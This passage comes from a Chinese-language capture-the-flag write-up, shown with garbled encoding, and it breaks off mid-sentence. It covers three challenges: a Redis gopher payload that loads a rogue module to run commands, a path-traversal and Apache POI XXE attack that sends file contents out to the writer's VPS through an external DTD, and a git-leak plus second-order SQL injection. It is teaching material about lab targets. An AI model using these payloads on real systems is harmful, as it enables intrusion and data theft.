href="https://github.com/n0b0dyCN/redis-rogue-server">å·¥å…·äºŒ</a></p><p>æŠŠexp.soå¤åˆ¶åˆ°å·¥å…·äºŒçš„ç›®å½•ä¸‹ï¼Œç„¶åä¿®æ”¹ä¸€ä¸‹payloadä»£ç å³å¯ï¼Œä½†æ˜¯æˆ‘æ²¡æœ‰æ‰“é€šï¼ŒåŠ è½½æ¨¡å—ä¸€ç›´å¤±è´¥ä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p><p>payloadè¦ä¿®æ”¹çš„åœ°æ–¹å¦‚å›¾ï¼š</p><p>ipå› ä¸ºéœ€è¦ç»•è¿‡è¦æ”¹ä¸€ä¸‹</p><p><img src="http://cdn.clown2024.cn/202407151704606.png" alt="image-20240520170058512"></p><p>vpsçš„åœ°å€è¿˜æœ‰è¦æ‰§è¡Œçš„å‘½ä»¤</p><p><img src="http://cdn.clown2024.cn/202407151704607.png" alt="image-20240520170142259"></p><p>è¿™æ˜¯å°†ä»–ç”Ÿæˆçš„payloadè§£ç åçš„å½¢å¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">gopher://0.0.0.0:6379/_*2<br>$4<br>AUTH<br>$4<br>root<br>*3<br>$7<br>SLAVEOF<br>$14<br>&lt;vpsåœ°å€&gt;<br>$4<br>8888<br>*4<br>$6<br>CONFIG<br>$3<br>SET<br>$3<br>dir<br>$5<br>/tmp/<br>*4<br>$6<br>config<br>$3<br>set<br>$10<br>dbfilename<br>$6<br>exp.so<br>*3<br>$6<br>MODULE<br>$4<br>LOAD<br>$11<br>/tmp/exp.so<br>*2<br>$11<br>system.exec<br>$14<br>cat$&#123;IFS&#125;/flag<br>*1<br>$4<br>quit<br></code></pre></td></tr></table></figure><h1 id="ç½‘é¼æ¯-2020é’é¾™ç»„filejava"><a href="#ç½‘é¼æ¯-2020é’é¾™ç»„-FileJava" class="headerlink" title="[ç½‘é¼æ¯ 2020é’é¾™ç»„]FileJava"></a>[ç½‘é¼æ¯ 2020é’é¾™ç»„]FileJava</h1><p>è¿™é¢˜çš„è€ƒç‚¹æ˜¯xxeï¼Œå¥½ä¹…æ²¡åšxxeçš„é¢˜äº†ï¼Œå¤ä¹ ä¸€ä¸‹</p><p>é¦–å…ˆæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¡µé¢</p><p><img src="http://cdn.clown2024.cn/202407151704608.png" alt="image-20240525155151570"></p><p>ä¸Šä¼ äº†ä¸€ä¸ªtxtæ–‡ä»¶ä¸Šå»çœ‹çœ‹</p><p><img src="http://cdn.clown2024.cn/202407151704609.png" alt="image-20240525155250427"></p><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªä¸‹è½½åœ°å€ï¼ŒæŠ“åŒ…çœ‹çœ‹ï¼Œè¿™ç§é€šå¸¸é…åˆä»»æ„æ–‡ä»¶ä¸‹è½½</p><p><img src="http://cdn.clown2024.cn/202407151704610.png" alt="image-20240525155333641"></p><p>æ”¹äº†ä¸€ä¸‹ä¸‹è½½çš„æ–‡ä»¶åï¼ŒæŠ¥é”™äº†ï¼Œè€Œä¸”ç»™äº†æˆ‘ä»¬è·¯å¾„ï¼Œé‚£å°±å°è¯•ä¸€ä¸ªè·¯å¾„ç©¿è¶Šè¯»ä¸€ä¸‹WEB-INFç›®å½•ä¸‹çš„æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?filename=../../../web.xml<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151704611.png" alt="image-20240525155530101"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸè¯»å–äº†æ–‡ä»¶ï¼Œçœ‹ä¸€ä¸‹æœ‰å“ªäº›é‡è¦çš„ç»„ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;servlet&gt;<br>        &lt;servlet-name&gt;DownloadServlet&lt;/servlet-name&gt;<br>        &lt;servlet-class&gt;cn.abc.servlet.DownloadServlet&lt;/servlet-class&gt;<br>&lt;/servlet&gt;<br><br>&lt;servlet&gt;<br>        &lt;servlet-name&gt;ListFileServlet&lt;/servlet-name&gt;<br>        &lt;servlet-class&gt;cn.abc.servlet.ListFileServlet&lt;/servlet-class&gt;<br>&lt;/servlet&gt;<br><br>&lt;servlet&gt;<br>        &lt;servlet-name&gt;UploadServlet&lt;/servlet-name&gt;<br>        &lt;servlet-class&gt;cn.abc.servlet.UploadServlet&lt;/servlet-class&gt;<br>&lt;/servlet&gt;<br></code></pre></td></tr></table></figure><p>æ ¹æ®åŒ…çš„è·¯å¾„å»åˆ†åˆ«æ‹¿ä¸€ä¸‹è¿™ä¸‰ä¸ªæºç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?filename=../../../classes/cn/abc/servlet/DownloadServlet.class<br>?filename=../../../classes/cn/abc/servlet/ListFileServlet.class<br>?filename=../../../classes/cn/abc/servlet/UploadServlet.class<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç”¨jadxåç¼–è¯‘ä¸€ä¸‹çœ‹çœ‹æºç </p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240525165256637.png" alt="image-20240525165256637"></p><p>çœ‹ä¸€ä¸‹downloadfileçš„æºç ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(request.getParameter(<span class="hljs-string">&quot;filename&quot;</span>).getBytes(<span class="hljs-string">&quot;ISO8859-1&quot;</span>), <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;filename=&quot;</span> + fileName);<br>        <span class="hljs-keyword">if</span> (fileName != <span class="hljs-literal">null</span> &amp;&amp; fileName.toLowerCase().contains(<span class="hljs-string">&quot;flag&quot;</span>)) &#123;<br>            request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;ç¦æ­¢è¯»å–&quot;</span>);<br>            request.getRequestDispatcher(<span class="hljs-string">&quot;/message.jsp&quot;</span>).forward(request, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileSaveRootPath</span> <span class="hljs-operator">=</span> getServletContext().getRealPath(<span class="hljs-string">&quot;/WEB-INF/upload&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> findFileSavePathByFileName(fileName, fileSaveRootPath);<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path + <span class="hljs-string">&quot;/&quot;</span> + fileName);<br>        <span class="hljs-keyword">if</span> (!file.exists()) &#123;<br>            request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;æ‚¨è¦ä¸‹è½½çš„èµ„æºå·²è¢«åˆ é™¤!&quot;</span>);<br>            request.getRequestDispatcher(<span class="hljs-string">&quot;/message.jsp&quot;</span>).forward(request, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">realname</span> <span class="hljs-operator">=</span> fileName.substring(fileName.indexOf(<span class="hljs-string">&quot;_&quot;</span>) + <span class="hljs-number">1</span>);<br>        response.setHeader(<span class="hljs-string">&quot;content-disposition&quot;</span>, <span class="hljs-string">&quot;attachment;filename=&quot;</span> + URLEncoder.encode(realname, <span class="hljs-string">&quot;UTF-8&quot;</span>));<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(path + <span class="hljs-string">&quot;/&quot;</span> + fileName);<br>        <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> response.getOutputStream();<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> in.read(buffer);<br>            <span class="hljs-keyword">if</span> (len &gt; <span class="hljs-number">0</span>) &#123;<br>                out.write(buffer, <span class="hljs-number">0</span>, len);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                in.close();<br>                out.close();<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦æ˜¯è¿‡æ»¤äº†flagï¼Œç¦æ­¢ç›´æ¥è¯»å–flagæ–‡ä»¶ã€‚</p><p>å…¶æœ‰å…³ä¸Šä¼ æ–‡ä»¶çš„å¤„ç†æºç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        ServletFileUpload upload;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">savePath</span> <span class="hljs-operator">=</span> getServletContext().getRealPath(<span class="hljs-string">&quot;/WEB-INF/upload&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">tempPath</span> <span class="hljs-operator">=</span> getServletContext().getRealPath(<span class="hljs-string">&quot;/WEB-INF/temp&quot;</span>);<br>        <span class="hljs-type">File</span> <span class="hljs-variable">tempFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(tempPath);<br>        <span class="hljs-keyword">if</span> (!tempFile.exists()) &#123;<br>            tempFile.mkdir();<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">DiskFileItemFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DiskFileItemFactory</span>();<br>            factory.setSizeThreshold(<span class="hljs-number">102400</span>);<br>            factory.setRepository(tempFile);<br>            upload = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletFileUpload</span>(factory);<br>            upload.setHeaderEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>            upload.setFileSizeMax(<span class="hljs-number">1048576L</span>);<br>            upload.setSizeMax(<span class="hljs-number">10485760L</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (FileUploadException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!ServletFileUpload.isMultipartContent(request)) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        List&lt;FileItem&gt; list = upload.parseRequest(request);<br>        <span class="hljs-keyword">for</span> (FileItem fileItem : list) &#123;<br>            <span class="hljs-keyword">if</span> (fileItem.isFormField()) &#123;<br>                fileItem.getFieldName();<br>                fileItem.getString(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> fileItem.getName();<br>                <span class="hljs-keyword">if</span> (filename != <span class="hljs-literal">null</span> &amp;&amp; !filename.trim().equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">fileExtName</span> <span class="hljs-operator">=</span> filename.substring(filename.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>) + <span class="hljs-number">1</span>);<br>                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> fileItem.getInputStream();<br>                    <span class="hljs-keyword">if</span> (filename.startsWith(<span class="hljs-string">&quot;excel-&quot;</span>) &amp;&amp; <span class="hljs-string">&quot;xlsx&quot;</span>.equals(fileExtName)) &#123;<br>                        <span class="hljs-keyword">try</span> &#123;<br>                            <span class="hljs-type">Workbook</span> <span class="hljs-variable">wb1</span> <span class="hljs-operator">=</span> WorkbookFactory.create(in);<br>                            <span class="hljs-type">Sheet</span> <span class="hljs-variable">sheet</span> <span class="hljs-operator">=</span> wb1.getSheetAt(<span class="hljs-number">0</span>);<br>                            System.out.println(sheet.getFirstRowNum());<br>                        &#125; <span class="hljs-keyword">catch</span> (InvalidFormatException e2) &#123;<br>                            System.err.println(<span class="hljs-string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);<br>                            e2.printStackTrace();<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">saveFilename</span> <span class="hljs-operator">=</span> makeFileName(filename);<br>                    request.setAttribute(<span class="hljs-string">&quot;saveFilename&quot;</span>, saveFilename);<br>                    request.setAttribute(<span class="hljs-string">&quot;filename&quot;</span>, filename);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">realSavePath</span> <span class="hljs-operator">=</span> makePath(saveFilename, savePath);<br>                    <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(realSavePath + <span class="hljs-string">&quot;/&quot;</span> + saveFilename);<br>                    <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>                    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>                        <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> in.read(buffer);<br>                        <span class="hljs-keyword">if</span> (len &lt;= <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-keyword">break</span>;<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            out.write(buffer, <span class="hljs-number">0</span>, len);<br>                        &#125;<br>                    &#125;<br>                    in.close();<br>                    out.close();<br>                    message = <span class="hljs-string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸ!&quot;</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>, message);<br>        request.getRequestDispatcher(<span class="hljs-string">&quot;/ListFileServlet&quot;</span>).forward(request, response);<br>    &#125;<br></code></pre></td></tr></table></figure><p>å…³é”®æ˜¯è¿™ä¸ªåœ°æ–¹å¤„ç†äº†xlsxæ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> fileItem.getName();<br>                <span class="hljs-keyword">if</span> (filename != <span class="hljs-literal">null</span> &amp;&amp; !filename.trim().equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">fileExtName</span> <span class="hljs-operator">=</span> filename.substring(filename.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>) + <span class="hljs-number">1</span>);<br>                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> fileItem.getInputStream();<br>                    <span class="hljs-keyword">if</span> (filename.startsWith(<span class="hljs-string">&quot;excel-&quot;</span>) &amp;&amp; <span class="hljs-string">&quot;xlsx&quot;</span>.equals(fileExtName)) &#123;<br>                        <span class="hljs-keyword">try</span> &#123;<br>                            <span class="hljs-type">Workbook</span> <span class="hljs-variable">wb1</span> <span class="hljs-operator">=</span> WorkbookFactory.create(in);<br>                            <span class="hljs-type">Sheet</span> <span class="hljs-variable">sheet</span> <span class="hljs-operator">=</span> wb1.getSheetAt(<span class="hljs-number">0</span>);<br>                            System.out.println(sheet.getFirstRowNum());<br>                        &#125; <span class="hljs-keyword">catch</span> (InvalidFormatException e2) &#123;<br>                            System.err.println(<span class="hljs-string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);<br>                            e2.printStackTrace();<br>                        &#125;<br>                    &#125;<br></code></pre></td></tr></table></figure><p>ç½‘ä¸Šæ˜¯æœ‰ä¸€ä¸ªxlsxçš„xxeæ¼æ´çš„ï¼š<a href="https://www.jianshu.com/p/73cd11d83c30">https://www.jianshu.com/p/73cd11d83c30</a></p><p>æ˜¯å…³äºApache POI 3.10çš„xxeæ¼æ´ï¼ŒApache POI æ˜¯ä¸€ä¸ªå¼€æºçš„ Java åº“ï¼Œç”¨äºå¤„ç† Microsoft Office æ ¼å¼çš„æ–‡æ¡£ã€‚å®ƒæä¾›äº†å¯¹ Excelã€Wordã€PowerPoint ç­‰æ–‡ä»¶æ ¼å¼çš„è¯»å†™æ”¯æŒï¼›ä¸Šé¢çš„ç‰ˆæœ¬åˆšå¥½ç¬¦åˆï¼Œæ‰€ä»¥ç›´æ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´æ‰“å³å¯ã€‚</p><p>å…¶æ¼æ´åŸå› æ˜¯ï¼š<code>poi-ooxml</code> åŒ…é‡Œ  <code>org.apache.poi.openxml4j.opc.internal.ContentTypeManager#parseContentTypesFile</code> ä¸­è¯»å–  <code>[Content-Types].xml</code> æ—¶æ²¡æœ‰è¿›è¡Œ XXE é˜²æŠ¤ã€‚</p><p>æˆ‘ä»¬æ–°å»ºä¸€ä¸ªexcel-1.xlsxæ–‡ä»¶ï¼Œç„¶åç”¨7zipæ‰“å¼€ï¼Œä¿®æ”¹[Content_Types].xmlæ–‡ä»¶ï¼Œåœ¨ç¬¬äºŒè¡ŒåŠ å…¥ä¸‹é¢å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;!DOCTYPE convert [ <br>&lt;!ENTITY % remote SYSTEM &quot;http://&lt;vps&gt;/evil.dtd&quot;&gt;<br>%remote;%int;%send;<br>]&gt;<br></code></pre></td></tr></table></figure><p>ç„¶åvpsä¸Šæ”¾ä¸€ä¸ªevil.dtd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;<br>&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://vps:port/?q=%file;&#x27;&gt;&quot;&gt;<br>%int;<br>%send;<br></code></pre></td></tr></table></figure><p>ç„¶åpythonèµ·ä¸€ä¸ªæœåŠ¡å™¨</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python -m http.server 80<br></code></pre></td></tr></table></figure><p>ç„¶åncç›‘å¬å¯¹åº”ç«¯å£</p><p><img src="http://cdn.clown2024.cn/202407151704612.png" alt="image-20240525172559030"></p><p>å³å¯æ‹¿åˆ°flag</p><h1 id="ç½‘é¼æ¯-2018comment"><a href="#ç½‘é¼æ¯-2018-comment" class="headerlink" title="[ç½‘é¼æ¯ 2018]comment"></a>[ç½‘é¼æ¯ 2018]comment</h1><p>é¢˜ç›®æ˜¾ç¤ºè€ƒç‚¹æ˜¯gitæºç æ³„éœ²å’Œsqlæ³¨å…¥</p><p><img src="http://cdn.clown2024.cn/202407151704613.png" alt="image-20240525180227593"></p><p>ä»–æœ‰ä¸€ä¸ªç™»é™†é¡µé¢</p><p><img src="http://cdn.clown2024.cn/202407151704614.png" alt="image-20240525180300399"></p><p>æ‰«ä¸€ä¸‹ç›®å½•çœ‹çœ‹ï¼Œå­˜åœ¨gitæ³„éœ²</p><p><img src="http://cdn.clown2024.cn/202407151704615.png" alt="image-20240525180323281"></p><p>ç”¨githackeræ‹¿ä¸€ä¸‹æºç </p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python GitHack.py --url <span class="hljs-string">&quot;http://node4.anna.nssctf.cn:28008/.git&quot;</span><br></code></pre></td></tr></table></figure><p>write_do.php</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„æºç ä¸å¤ªå…¨ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥ä¸€ä¸‹æœ‰æ²¡æœ‰å†å²ç‰ˆæœ¬</p><blockquote><p>é¢é¢é¢è¿™äº›githackå·¥å…·å¥½å¥‡æ€ªï¼Œæˆ‘ä¸€å¼€å§‹ç”¨çš„åªæœ‰æºç æ²¡æœ‰.gitï¼Œç„¶åæ¢äº†ä¸€ä¸ªåªæœ‰.gitæ²¡æœ‰æºç </p><p>èƒ½ä¸‹è½½.gitçš„å·¥å…·åœ°å€ï¼š<a href="https://github.com/BugScanTeam/GitHack?tab=readme-ov-file%EF%BC%8C%E9%9C%80%E8%A6%81%E7%94%A8python2%E6%89%A7%E8%A1%8C">https://github.com/BugScanTeam/GitHack?tab=readme-ov-fileï¼Œéœ€è¦ç”¨python2æ‰§è¡Œ</a></p></blockquote><p>ç„¶åç”¨é‚£ä¸ªæœ‰.gitçš„çœ‹ä¸€ä¸‹å†å²ç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">log</span> --all<br><span class="hljs-comment">#ç„¶åå›é€€åˆ°æŒ‡å®šç‰ˆæœ¬</span><br>git reset --hard  &lt;ç‰ˆæœ¬å·&gt;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151704616.png" alt="image-20240525222414607"></p><p>éš¾ç»·æˆ‘æ¯ä¸€ä¸ªéƒ½å°è¯•äº†ä¸€éè¿˜æ˜¯åªæœ‰é‚£ä¸ªç®€çŸ­çš„phpæ–‡ä»¶ä¸çŸ¥é“æ˜¯ä¸æ˜¯nssé¶åœºçš„ç¯å¢ƒå‡ºé—®é¢˜äº†ï¼Œç›´æ¥æ‹¿åˆ«äººçš„æºç å¥½äº†</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>    &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>            <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>            <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>            <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>            <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">                    set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                        title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                        content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>            <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>            <span class="hljs-variable">$bo_id</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>            <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>            <span class="hljs-variable">$num</span> = <span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$num</span> &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>                <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>                <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">                        set category = &#x27;<span class="hljs-subst">$categoty</span>&#x27;,</span><br><span class="hljs-string">                            content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                            bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>                <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>            &#125;<br>            <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œå®¡è®¡ä¸€ä¸‹å†™è¯„è®ºçš„æºç å°±çŸ¥é“ï¼Œåœ¨æˆ‘ä»¬å†™çš„æ—¶å€™è¿›è¡Œäº†è½¬ä¹‰ï¼Œä½†æ˜¯åœ¨åé¢commentçš„æ—¶å€™ç›´æ¥æŠŠæˆ‘ä»¬å†™è¿›å»çš„ä¸œè¥¿æ‹¿å‡ºæ¥ç”¨äº†æ²¡æœ‰è½¬ä¹‰ï¼Œå¾ˆæ˜æ˜¾çš„äºŒæ¬¡æ³¨å…¥</p><p>ä½†æ˜¯å†™è¯„è®ºéœ€è¦ç™»é™†ï¼Œå¯†ç æ˜¯çˆ†ç ´å‡ºæ¥çš„ç›´æ¥çœ‹wpäº†æ‡’å¾—çˆ†äº†ï¼Œå¯†ç ä¸º666</p><p>å»æŠ“äº†commentçœ‹äº†ä¸€ä¸‹ï¼Œæ˜¯ç™»é™†ä¹‹åå†™è¯„è®º</p><p><img src="http://cdn.clown2024.cn/202407151704617.png" alt="image-20240525224542816"></p><p>å‘å¸–åˆ™æ˜¯writeï¼Œå°±æ˜¯å…ˆå¼€ä¸€ä¸ªæ ç›®çš„æ ·å­</p><p><img src="http://cdn.clown2024.cn/202407151704618.png" alt="image-20240525224624145"></p><p>é€šè¿‡ä¸Šé¢çš„æºç 